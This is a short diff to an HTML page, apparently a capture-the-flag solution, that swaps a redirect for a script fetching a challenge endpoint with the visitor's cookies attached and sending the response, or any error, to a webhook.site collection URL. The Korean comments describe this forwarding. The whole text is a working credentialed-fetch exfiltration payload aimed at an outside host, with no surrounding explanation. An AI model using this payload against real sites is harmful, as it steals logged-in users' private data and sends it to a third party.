@@ -6,7 +6,19 @@
 </head>
 <body>
 <script>
-    window.location.href = "https://digitaltrustctf2026-ep21-trusted-origin.chals.io/api/episode21/cargo-manifest";
+    fetch("https://digitaltrustctf2026-ep21-trusted-origin.chals.io/api/episode21/cargo-manifest", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(r => r.text())
+    .then(data => {
+      // 데이터를 성공적으로 가져오면 Webhook으로 전송
+      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data));
+    })
+    .catch(e => {
+      // 에러가 발생해도 Webhook으로 전송
+      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e)));
+    });
 </script>
 </body>
 </html>
